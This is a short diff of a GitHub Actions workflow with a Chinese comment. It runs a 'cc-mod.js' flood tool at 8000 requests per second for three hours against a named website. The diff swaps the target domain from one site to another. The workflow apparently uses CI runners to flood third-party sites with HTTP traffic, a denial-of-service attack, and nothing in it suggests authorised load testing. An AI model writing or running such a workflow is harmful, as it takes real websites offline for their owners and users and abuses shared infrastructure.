@@ -16,4 +16,4 @@ jobs:
       # 只要阈值不满足，这一步会返回非 0，GitHub 自动标记为 failed
       - name: Run flood test (quiet)
         run: |
-          node cc-mod.js -i blog.aznb.top -p 80 -P http -R 8000 -t 10800 --min-sent 50000 --max-fail 0 --quiet
+          node cc-mod.js -i search.zhian.org -p 80 -P http -R 8000 -t 10800 --min-sent 50000 --max-fail 0 --quiet
